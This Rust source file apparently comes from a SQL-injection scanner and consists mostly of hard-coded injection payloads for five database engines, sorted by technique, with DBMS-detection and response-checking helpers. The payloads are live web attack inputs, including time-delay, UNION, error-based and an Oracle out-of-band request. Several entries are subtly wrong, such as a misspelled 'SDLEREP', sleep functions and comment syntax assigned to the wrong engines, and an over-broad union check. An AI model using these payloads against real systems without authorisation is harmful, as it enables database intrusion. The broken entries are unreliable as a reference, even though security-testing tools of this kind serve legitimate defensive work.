use super::types::{SqliRiskLevel, SqliTechnique};

pub struct PayloadSet {
    pub mysql: Vec<&'static str>,
    pub postgres: Vec<&'static str>,
    pub mssql: Vec<&'static str>,
    pub oracle: Vec<&'static str>,
    pub sqlite: Vec<&'static str>,
}

pub struct SqliPayloads {
    pub boolean_blind: PayloadSet,
    pub time_based: PayloadSet,
    pub union: PayloadSet,
    pub error_based: PayloadSet,
}

impl Default for SqliPayloads {
    fn default() -> Self {
        Self {
            boolean_blind: PayloadSet {
                mysql: vec![
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' OR '1'='1",
                    "' OR '1'='2",
                    "1' AND 1=1--",
                    "1' AND 1=2--",
                    "1' OR '1'='1",
                    "1 AND 1=1",
                    "1 AND 1=2",
                    "1 OR 1=1",
                ],
                postgres: vec![
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' OR '1'='1",
                    "' OR '1'='2",
                    "1' AND 1=1--",
                    "1' AND 1=2--",
                    "1' OR '1'='1",
                ],
                mssql: vec![
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' OR '1'='1",
                    "' OR '1'='2",
                    "1 AND 1=1",
                    "1 AND 1=2",
                    "1 OR 1=1",
                    "'; IF 1=1 SELECT 1 ELSE SELECT 0--",
                ],
                oracle: vec![
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' OR '1'='1",
                    "' OR '1'='2",
                    "1' AND 1=1--",
                    "1' AND 1=2--",
                ],
                sqlite: vec![
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' OR '1'='1",
                    "' OR '1'='2",
                    "1 AND 1=1",
                    "1 AND 1=2",
                    "1 OR 1=1",
                ],
            },
            time_based: PayloadSet {
                mysql: vec![
                    "'; SELECT SLEEP(5)--",
                    "'; SELECT SLEEP(5)#",
                    "'; SELECT SLEEP(5)",
                    "1; SELECT SLEEP(5)--",
                    "'; SLEEP(5)--",
                    "' OR SLEEP(5)--",
                    "1' OR SLEEP(5)--",
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' OR 1=1 AND SLEEP(5)--",
                    "'; SELECT BENCHMARK(5000000,MD5('test'))--",
                ],
                postgres: vec![
                    "'; SELECT pg_sleep(5)--",
                    "'; SELECT pg_sleep(5)#",
                    "'; SELECT pg_sleep(5)",
                    "1; SELECT pg_sleep(5)--",
                    "'; SLEEP(5)--",
                    "1' OR pg_sleep(5)--",
                    "'; SELECT 1 FROM pg_sleep(5)--",
                    "' OR 1=1 AND pg_sleep(5)--",
                    "'; SELECT generate_series(1,5000000)--",
                ],
                mssql: vec![
                    "'; WAITFOR DELAY '00:00:05'--",
                    "'; WAITFOR DELAY '00:00:05'",
                    "1; WAITFOR DELAY '00:00:05'--",
                    "'; IF 1=1 WAITFOR DELAY '00:00:05'--",
                    "' OR 1=1 WAITFOR DELAY '00:00:05'--",
                    "'; SELECT DATEADD(s,5,GETDATE())--",
                ],
                oracle: vec![
                    "'; SELECT UTL_INADDR.get_host_name() FROM DUAL--",
                    "'; SELECT UTL_HTTP.REQUEST('http://example.com') FROM DUAL--",
                    "'; SELECT DBMS_LOCK.SLEEP(5) FROM DUAL--",
                    "1; SELECT DBMS_LOCK.SLEEP(5) FROM DUAL--",
                ],
                sqlite: vec![
                    "'; SELECT SLEEP(5)--",
                    "'; SELECT SDLEREP(5)--",
                    "1; SELECT SLEEP(5)--",
                    "' OR 1=1 AND SLEEP(5)--",
                ],
            },
            union: PayloadSet {
                mysql: vec![
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT 1--",
                    "' UNION SELECT 1,2--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT 1,2,3,4--",
                    "' UNION ALL SELECT NULL--",
                    "' UNION ALL SELECT NULL,NULL--",
                    "' UNION ALL SELECT NULL,NULL,NULL--",
                    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
                    "' UNION ALL SELECT 1,2,3,4,5--",
                ],
                postgres: vec![
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT 1::text--",
                    "' UNION SELECT 1,2::text--",
                    "' UNION SELECT 1,2,3::text--",
                    "' UNION ALL SELECT NULL--",
                    "' UNION ALL SELECT NULL,NULL--",
                    "' UNION ALL SELECT NULL,NULL,NULL--",
                    "' UNION ALL SELECT 1,2,3--",
                ],
                mssql: vec![
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT 1--",
                    "' UNION SELECT 1,2--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION ALL SELECT NULL--",
                    "' UNION ALL SELECT NULL,NULL--",
                    "' UNION ALL SELECT NULL,NULL,NULL--",
                    "' UNION ALL SELECT 1,2,3,4--",
                ],
                oracle: vec![
                    "' UNION SELECT NULL FROM DUAL--",
                    "' UNION SELECT NULL,NULL FROM DUAL--",
                    "' UNION SELECT NULL,NULL,NULL FROM DUAL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL FROM DUAL--",
                    "' UNION SELECT 1,2 FROM DUAL--",
                    "' UNION SELECT 1,2,3 FROM DUAL--",
                    "' UNION ALL SELECT NULL FROM DUAL--",
                    "' UNION ALL SELECT NULL,NULL FROM DUAL--",
                ],
                sqlite: vec![
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT 1--",
                    "' UNION SELECT 1,2--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION ALL SELECT NULL--",
                    "' UNION ALL SELECT NULL,NULL--",
                    "' UNION ALL SELECT NULL,NULL,NULL--",
                ],
            },
            error_based: PayloadSet {
                mysql: vec![
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
                    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(FLOOR(RAND(0)*2),0x7e,VERSION())x FROM information_schema.tables GROUP BY x)a)--",
                    "' AND 1=1 UNION SELECT EXP(1)--",
                    "1' AND 1=1 UNION SELECT UPDATEXML(1,VERSION(),1)--",
                ],
                postgres: vec![
                    "' AND 1=1/(SELECT 1 FROM PG_SLEEP(0))--",
                    "' AND 1=1::text::int--",
                    "' AND CASE WHEN 1=1 THEN 1/0 ELSE 1 END--",
                    "' AND 1=1 AND 1::int=1--",
                ],
                mssql: vec![
                    "' AND 1=1 CAST(VERSION() AS INT)--",
                    "' AND 1=1 CONVERT(INT,VERSION())--",
                    "'; SELECT 1/0--",
                    "' AND 1=1 WHERE 1=1 AND 1=1--",
                ],
                oracle: vec![
                    "' AND 1=1 OR EXTRACTVALUE(1,VERSION())--",
                    "' AND 1=1 OR UTL_INADDR.get_host_name()--",
                    "' AND 1=1 OR DBMS_UTILITY.SQLID_TO_SQLHASH(1)--",
                ],
                sqlite: vec![
                    "' AND 1=1/0--",
                    "' AND 1=1 AND 1=1 AND 1=1--",
                    "1' AND 1=1 AND 1=1 AND 1=1",
                ],
            },
        }
    }
}

impl SqliPayloads {
    pub fn get_payloads(&self, technique: SqliTechnique, dbms: &str) -> Vec<&'static str> {
        let set = match technique {
            SqliTechnique::BooleanBlind => &self.boolean_blind,
            SqliTechnique::TimeBased => &self.time_based,
            SqliTechnique::Union => &self.union,
            SqliTechnique::ErrorBased => &self.error_based,
        };

        match dbms.to_lowercase().as_str() {
            "mysql" => set.mysql.clone(),
            "postgresql" | "postgres" => set.postgres.clone(),
            "mssql" | "sqlserver" => set.mssql.clone(),
            "oracle" => set.oracle.clone(),
            "sqlite" => set.sqlite.clone(),
            _ => set.mysql.clone(),
        }
    }

    pub fn get_payloads_for_risk(&self, technique: SqliTechnique, dbms: &str, risk: SqliRiskLevel) -> Vec<&'static str> {
        let all = self.get_payloads(technique, dbms);
        match risk {
            SqliRiskLevel::Low => all.into_iter().take(3).collect(),
            SqliRiskLevel::Medium => all.into_iter().take(6).collect(),
            SqliRiskLevel::High => all,
        }
    }

    pub fn detect_dbms(&self, error_response: &str) -> Option<String> {
        let lower = error_response.to_lowercase();

        if lower.contains("mysql") || lower.contains("mariadb") || lower.contains("you have an error in your sql") {
            return Some("MySQL".to_string());
        }
        if lower.contains("postgresql") || lower.contains("psqlexception") || lower.contains("pgerror") {
            return Some("PostgreSQL".to_string());
        }
        if lower.contains("microsoft sql server") || lower.contains("mssql") || lower.contains("sqlserver") {
            return Some("MSSQL".to_string());
        }
        if lower.contains("oracle") || lower.contains("ora-") || lower.contains("oracle error") {
            return Some("Oracle".to_string());
        }
        if lower.contains("sqlite") || lower.contains("sqlitelogicerror") || lower.contains("sqlite3") {
            return Some("SQLite".to_string());
        }

        None
    }
}

pub struct SqliChecker;

impl SqliChecker {
    pub fn is_boolean_true(response: &str, original: &str) -> bool {
        response != original
    }

    pub fn is_time_based_suspicious(time_ms: u64, baseline_ms: u64, threshold: u64) -> bool {
        time_ms > baseline_ms + threshold
    }

    pub fn has_union_signature(response: &str) -> bool {
        let lower = response.to_lowercase();
        lower.contains("union") ||
        lower.contains("select") ||
        lower.contains("null") ||
        response.contains("1=1") ||
        response.contains("2=2")
    }

    pub fn has_error_signature(response: &str) -> bool {
        let lower = response.to_lowercase();
        lower.contains("sql") && (lower.contains("error") || lower.contains("exception") || lower.contains("syntax")) ||
        lower.contains("ora-") ||
        lower.contains("mysql") ||
        lower.contains("postgresql") ||
        lower.contains("sqlite3") ||
        lower.contains("warning") && lower.contains("mysql")
    }
}